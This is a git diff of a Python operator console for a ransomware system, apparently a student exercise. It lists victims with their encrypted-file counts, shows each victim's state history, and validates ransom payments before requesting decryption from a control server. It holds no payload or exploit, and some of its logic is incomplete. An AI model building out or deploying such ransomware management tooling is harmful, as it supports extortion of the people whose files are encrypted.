@@ -1,11 +1,12 @@
 from ..utile import network as net
 from ..utile import message as mess
 
+# Connexion au serveur
+serv = net.connect_to_serv()
 
-
-def choix_victime(new_data_victimes):
+def choix_victime(liste_victime):
     # Demande du numéro de la victime
-    nb_victime = len(new_data_victimes)
+    nb_victime = len(liste_victime)
     num_victime = int(input("Entrez le numéro de la victime (de 1 à 4):"))
 
     # Vérification de l'input de l'utilisateur
@@ -31,80 +32,85 @@ def choix_action():
 
     return choix
 
-def afficher_liste_victime(new_data_victimes):
+def afficher_liste_victime(data_victimes):
 
     print("LISTING DES VICTIMES DU RANSOMWARE")
-    print("___________________________________")
-    print("num  id             type        disques        statut     nb. de fichiers")
+    print("----------------------------------")
 
-    #Affichage des victimes avec un format + ajout d'un numéro pour chaque victime
-    form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:30}"
-    for i, val in enumerate(new_data_victimes):
-        val.insert(0, str(i + 1))
-        print(form.format(*val))
+    # Affichage de chaque victime avec un format 'form'
+    form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:}"
+    print(form.format("id", "hash", "type", "disques", "statut", "nb. de fichiers"))
 
-    return
+    for value in data_victimes:
+        # Vérifie l'état pour savoir si ca affichera des fichiers "chiffrés", "déchiffrés" ou rien
+        if value['STATE'] == 'PENDING':
+            form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:} fichiers chiffrés"
+        elif value['STATE'] == 'PROTECTED':
+            form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:} fichiers déchiffrés"
+        elif value['STATE'] == 'INITIALIZE':
+            form = "{0:5}{1:15}{2:12}{3:15}{4:11}-"
+        # Variable qui contient le hash pour pouvoir le couper après
+        hash = value['HASH']
+        print(form.format(str(value['VICTIM']).zfill(4), hash[:14], value['OS'], value['DISKS'], value['STATE'], str(value['NB_FILES'])))
 
-def afficher_historique_victime(new_data_victimes):
-
-    victime = choix_victime(new_data_victimes)
-
-    #Récupération de l'id de la victime grâce au num que l'utilisateur à entré
-    for i in new_data_victimes:
-        if i[0] == str(victime):
-            id_victime = int(i[1])
-
-    #Appel de la fonction qui retournera les infos de la victime précise grâce à l'id
-    data_victimes = data.recup_data_victime(2,id_victime)
+def afficher_historique_victime(data_victimes):
 
     print("HISTORIQUE DES ETATS D'UNE VICTIME")
     print("___________________________________")
 
 
-    form = "{0:11}{1:9} - {2:14} - {3:20}"
-    for val in data_victimes:
-        print(form.format(*val))
+    form = "{0:20} - {1:14} - {2:20}"
+    for value in data_victimes:
+        # Vérifie l'état pour savoir si ca affichera des fichiers "chiffrés", "déchiffrés" ou rien
+        if value['STATE'] == 'PENDING':
+            form = "{0:20} - {1:14} - {2:} fichiers chiffrés"
+        elif value['STATE'] == 'PROTECTED':
+            form = "{0:20} - {1:14} - {2:} fichiers déchiffrés"
+        else:
+            form = "{0:20} - {1:14}"
+        print(form.format(str(value['TIMESTAMP']),str(value['STATE']), str(value['NB_FILES'])))
 
-    return
+def afficher_rancon_victime(data_victimes):
 
-def afficher_rancon_victime(new_data_victimes):
+    #Demande le numéro de la victime pour qui la rançon a été payée
+    num_victime = str(choix_victime(data_victimes))
 
-    print("VALIDER LE PAIEMENT DE RANCON D'UNE VICTIME")
-    print("____________________________________________")
+    temp2 = True
 
-    num_victime = choix_victime(new_data_victimes)
-    victime = new_data_victimes[num_victime-1]
-    etat_victime = str.upper(victime[8])
+    while temp2:
+        for victime in data_victimes:
 
-    while etat_victime == 'INITIALIZE' or etat_victime == 'PROTECTED':
-        print(f"ERREUR : La victime {num_victime} {victime[1]} est en mode {etat_victime}!")
-        num_victime = choix_victime(new_data_victimes)
-        victime = new_data_victimes[num_victime - 1]
-        etat_victime = str.upper(victime[8])
+            if victime['VICTIM'] == num_victime:
 
-    choix = str.upper(input(f"Confirmez la demande de déchiffrement pour la victime {num_victime} {victime[1]} (O/N):"))
+                if victime['STATE'] == 'PENDING':
 
-    if choix == 'O':
+                    choix = str.upper(input(f"Confirmez la demande de déchiffrement pour la victime {victime['VICTIM']} (O/N):"))
+                    if choix == 'O':
 
-        #Ici je suis censée envoyer un truc mais jsp comment ni avec quoi :/
+                        # Envoie au serveur la requête de l'historique d'une victime
+                        #net.send_message(serv, mess.set_message('CHANGE_STATE', [victime['VICTIM'], victime['STATE']]))
 
-        print("La demande est transmise !")
-    else:
-        print("La demande ne sera pas transmise.")
-
-    return
+                        print("La demande est transmise !")
+                        temp2 = False
+                    else:
+                        print("La demande ne sera pas transmise.")
+                        temp2 = False
+                else:
+                    print(f"ERREUR : La victime {victime['VICTIM']} est en mode {victime['STATE']}!")
+                    afficher_rancon_victime(data_victimes)
 
 
 if __name__ == "__main__":
 
-    # Connexion au serveur
-    serv = net.connect_to_serv()
-
     # Variable qui s'occupera de vérifier si l'utilisateur à bien fait le choix 1 avant de pouvoir faire tous les autres
     ordre_choix = False
-
     # Affiche une première fois le menu et stocke le choix
     num_choix = choix_action()
+    # Création des listes qui seront remplies
+    liste_victime = []
+    historique_victime = []
+    # Création d'une liste vide qui contiendra la liste des victimes et d'une variable temp pour pouvoir boucler sur la boucle while d'en dessous
+    temp = True
 
     # Boucle tant que l'utilisateur ne choisi pas le quatrième choix (quitter)
     while num_choix != 4:
@@ -116,30 +122,43 @@ if __name__ == "__main__":
             ordre_choix = True
             # Envoie au serveur la requête de liste des victimes
             net.send_message(serv,mess.set_message('LIST_VICTIMS_REQ'))
-            # Création d'une liste vide qui contiendra la liste des victimes et d'une variable temp pour pouvoir boucler sur la boucle while d'en dessous
-            liste_victime = []
-            temp = True
+
             # Boucle qui ajoute les victimes dans la liste "liste_victimes"
             while temp:
-                victime = net.receive_message(serv)
-                if mess.set_message(victime) == 'LIST_VICTIM_RESP':
-                    liste_victime.append(victime)
+                ligne_victime = net.receive_message(serv)
+                if mess.get_message_type(ligne_victime) == 'LIST_VICTIM_RESP':
+                    liste_victime.append(ligne_victime)
                     continue
-                elif mess.set_message(victime) == 'LIST_VICTIM_END':
+                elif mess.get_message_type(ligne_victime) == 'LIST_VICTIM_END':
                     temp = False
 
-            # A partir de data_victimes, création d'une nouvelle liste de listes (et plus de tuple) avec les infos des victimes
-            #new_data_choix1 = []
-            #for val in data_choix1:
-                #new_data_choix1.append(list(val))
-
+            # Affiche les victimes à l'aide de la fonction afficher_liste_victime()
             afficher_liste_victime(liste_victime)
 
         # Deuxième choix, ne s'affiche QUE si l'utilisateur a déjà fait le choix 1 avant, sinon affiche une erreur:
         elif num_choix == 2:
 
             if ordre_choix:
-                afficher_historique_victime(new_data_victimes)
+                # Demande le numéro de la victime (qui est également l'ID de la victime)
+                num_victime = choix_victime(liste_victime)
+                # Ajoute l'id de la victime dans une liste car la fonction mess.set_message vérifie la taille de l'id à 1 (donc 1 élément d'une liste)
+                id_victime = [num_victime]
+
+                # Envoie au serveur la requête de l'historique d'une victime
+                net.send_message(serv, mess.set_message('HISTORY_REQ', id_victime))
+                # Je réinitialise la variable temp au cas où elle serait toujours False du choix précédent
+                temp = True
+
+                while temp:
+                    ligne_historique = net.receive_message(serv)
+                    if mess.get_message_type(ligne_historique) == 'HISTORY_RESP':
+                        historique_victime.append(ligne_historique)
+                        continue
+                    elif mess.get_message_type(ligne_historique) == 'HISTORY_END':
+                        temp = False
+
+                afficher_historique_victime(historique_victime)
+
             else:
                 print("\nERREUR : Veuillez d'abord lister les victimes!\n")
 
@@ -147,7 +166,12 @@ if __name__ == "__main__":
         elif num_choix == 3:
 
             if ordre_choix:
-                afficher_rancon_victime()
+
+                print("VALIDER LE PAIEMENT DE RANCON D'UNE VICTIME")
+                print("____________________________________________")
+
+                afficher_rancon_victime(liste_victime)
+
             else:
                 print("\nERREUR : Veuillez d'abord lister les victimes!\n")
 
